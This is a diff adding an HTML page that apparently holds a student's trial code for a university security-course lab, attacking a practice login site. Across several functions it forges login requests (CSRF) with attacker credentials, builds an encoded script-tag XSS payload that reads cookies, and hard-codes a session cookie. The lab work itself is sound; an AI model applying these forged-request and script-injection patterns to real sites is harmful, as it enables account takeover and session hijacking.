@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta name="description" content="Webpage description goes here" />
+  <meta charset="utf-8">
+  <title>Change_me</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="author" content="">
+<!--   <link rel="stylesheet" href="css/style.css">
+ -->  <script src="http://code.jquery.com/jquery-latest.min.js"></script>
+</head>
+
+<body>
+  
+<div class="container">
+  
+</div>
+
+<form onsubmit="myFunction()">
+  <label for="fname">First name:</label><br>
+  <input type="text" id="fname" name="fname"><br>
+  <label for="lname">Last name:</label><br>
+  <input type="text" id="lname" name="lname">
+  <input type="submit">
+</form>
+
+<iframe id="frame1" src="http://cis551.cis.upenn.edu/project3/" name="frame1"></iframe>
+
+<script>
+  function myFunction() {
+    alert(0);
+    $.post("http://cis551.cis.upenn.edu/project3/login?csrfdefense=0&xssdefense=0", 
+    {username:"attacker", password: "123456"}, 
+    function(e){
+      console.log("hit");
+      console.log(e);
+    });
+}
+
+// var iframe = document.createElement('iframe');
+
+// iframe.src = 'http://cis551.cis.upenn.edu/project3/';
+
+// iframe.style = "display: none;"
+// document.body.appendChild(iframe);
+
+document.body.onload = function() {
+    console.info("index loaded");
+    var frame1 = document.getElementById("frame1");
+    frame1.contentWindow.document.getElementById("username").value = 'asdf';
+    frame1.contentWindow.document.getElementById("password").value = 'asdf';
+}
+
+
+
+
+// $.ajax({
+//     url: "http://cis551.cis.upenn.edu/project3/login?csrfdefense=0&xssdefense=4",
+//     type: "POST",
+//     headers: {  'Access-Control-Allow-Origin': 'no-cors' },
+//     crossDomain: true,
+//     data: { username: "attacker", password: "123456" },
+//     success: function (response) {
+//         var resp = JSON.parse(response)
+//         alert(resp.status);
+//     },
+//     error: function (xhr, status) {
+//         alert("error");
+//     }
+// });
+
+
+// function fakeLogin(usrname, pass) {
+// 	$.post( "http://cis551.cis.upenn.edu/project3/login?csrfdefense=0&xssdefense=4", { username: "victim", password: "123456" })
+// 	  .done(function( data ) {
+// 	    alert( "Data Loaded: " + data );
+// 	 });
+//  }
+//  fakeLogin("asdf", "asdf");
+
+function hello2() {
+  var settings = {
+  "url": "http://cis551.cis.upenn.edu/project3/login?csrfdefense=0&xssdefense=4",
+  "method": "POST",
+  "timeout": 0,
+  "headers": {
+    "Content-Type": "application/x-www-form-urlencoded",
+  },
+  "data": {
+    "username": "attacker",
+    "password": "123456"
+  }
+};
+$.ajax(settings).done(function (response) {
+  console.log(response);
+});
+}
+
+   function OpenWindowWithPost() {
+            var url = "http://cis551.cis.upenn.edu/project3/login?csrfdefense=0&xssdefense=0";
+            var windowoption = "width=730,height=345,left=100,top=100,resizable=yes,scrollbars=yes"
+            var name = "test";
+            var params = { 'username' : 'attacker', 'password' : 123456};     
+
+            var form = document.createElement("form");
+            form.setAttribute("method", "post");
+            form.setAttribute("action", url);
+
+            for (var i in params) {
+                if (params.hasOwnProperty(i)) {
+                    var input = document.createElement('input');
+                    input.type = 'hidden';
+                    input.name = i;
+                    input.value = params[i];
+                    form.appendChild(input);
+                }
+            }
+            
+            document.body.appendChild(form);
+            
+            // var newWindow = window.open("post.html", name, windowoption);
+
+             form.submit(function() {
+                  $.ajax({
+                      type: 'POST',
+                      url: url,
+                      data: { username: "attacker", 
+                              password: 123456 }
+                  });
+                  console.log('hit');
+                  return false;
+              });
+
+            document.body.removeChild(form);  
+
+      setTimeout(() => {
+            console.log(window.document.cookie);            
+            console.log("we waited task ms to run this code, oh boy wowwoowee!");
+      }, 1000);            // document.body.removeChild(form);
+    }
+
+    // OpenWindowWithPost();
+
+
+
+function hello() {
+  fetch('http://cis551.cis.upenn.edu/project3/login?csrfdefense=0&xssdefense=4', {
+    method: 'POST', // or 'PUT'
+    headers: {
+      'Content-Type': "application/x-www-form-urlencoded",
+    },
+    body: {username:"attacker", password: "123456"},
+  })
+  console.log("hey")
+}
+
+function post() {
+  console.log("hey");
+  console.log(document.cookie);
+  $.post("http://cis551.cis.upenn.edu/project3/login?csrfdefense=1&xssdefense=0", 
+  {username:"attacker", password: "123456"}, 
+  function(e){
+    console.log(e);
+  });
+}
+
+// post();
+
+var s = encodeURIComponent(post.toString());
+
+console.log(s);
+var complete = encodeURIComponent("<script>" + post.toString() + ";" + "post();" + "</" + "script" + ">");
+console.log(complete);
+
+
+// var iframe = document.createElement('iframe');
+
+// iframe.src = 'http://cis551.cis.upenn.edu/project3/';
+
+// // iframe.style = "display: none;"
+// document.body.appendChild(iframe);
+
+// setTimeout(() => {
+//   console.log('hit');
+
+//       iframe.document.getElementById("username").value = 'asdf';
+//       iframe.document.getElementById("password").value = 'asdf';
+// }, 1000);  
+
+
+
+// myframe.document.getElementById("searchForm").submit();
+
+
+// var settings = {
+//   "url": "http://cis551.cis.upenn.edu/project3/login?csrfdefense=0&xssdefense=4",
+//   "method": "POST",
+//   "timeout": 0,
+//   "headers": {
+//     "Content-Type": "application/x-www-form-urlencoded",
+//     "Cookie": "authuser=\"!pRG1Qg26ygjTn6vHbuhgzQ==?gAJVCGF1dGh1c2VycQFVCGF0dGFja2VycQKGcQMu\"; xssdefense=4; csrfdefense=0"
+//   },
+//   "data": {
+//     "username": "attacker",
+//     "password": "123456"
+//   }
+// };
+
+// $.ajax(settings).done(function (response) {
+//   console.log(response);
+// });
+
+      //  var param = { 'username' : 'attacker', 'password' : 123456};		    		
+      // OpenWindowWithPost("http://cis551.cis.upenn.edu/project3/login?csrfdefense=0&xssdefense=4", 
+      // "width=730,height=345,left=100,top=100,resizable=yes,scrollbars=yes", 
+      // "NewFile", param);	
+
+
+
+// $.post( "http://cis551.cis.upenn.edu/project3/login?csrfdefense=0&xssdefense=4", { username: "attacker", password: "123456" }, function(data){ 
+//   console.log(data);
+// });
+
+var myHeaders = new Headers();
+myHeaders.append("Content-Type", "application/x-www-form-urlencoded");
+myHeaders.append("Cookie", "authuser=\"!pRG1Qg26ygjTn6vHbuhgzQ==?gAJVCGF1dGh1c2VycQFVCGF0dGFja2VycQKGcQMu\"; xssdefense=4; csrfdefense=0");
+
+var urlencoded = new URLSearchParams();
+urlencoded.append("username", "attacker");
+urlencoded.append("password", "123456");
+
+var requestOptions = {
+  method: 'POST',
+  headers: myHeaders,
+  body: urlencoded,
+  mode: 'no-cors',
+  redirect: 'follow'
+};
+
+fetch("http://cis551.cis.upenn.edu/project3/login?csrfdefense=0&xssdefense=4", requestOptions)
+  .then(response => response.text())
+  .then(result => console.log(result))
+  .catch(error => console.log('error', error));
+
+ /*
+var myHeaders = new Headers();
+myHeaders.append("Content-Type", "application/x-www-form-urlencoded");
+// myHeaders.append("Cookie", "authuser=\"!pRG1Qg26ygjTn6vHbuhgzQ==?gAJVCGF1dGh1c2VycQFVCGF0dGFja2VycQKGcQMu\"; xssdefense=4; csrfdefense=0");
+
+var urlencoded = new URLSearchParams();
+urlencoded.append("username", "attacker");
+urlencoded.append("password", "123456");
+
+var requestOptions = {
+  method: 'POST',
+  headers: myHeaders,
+  body: urlencoded,
+  mode: 'no-cors',
+  redirect: 'follow'
+};
+
+fetch("http://cis551.cis.upenn.edu/project3/login?csrfdefense=0&xssdefense=4", requestOptions)
+  .then(response => console.log(response.text()))
+  .then(result => console.log(result))
+  .catch(error => console.log('error', error));
+  //    mode: 'no-cors',
+*/
+</script>
+
+</body>
+</html>
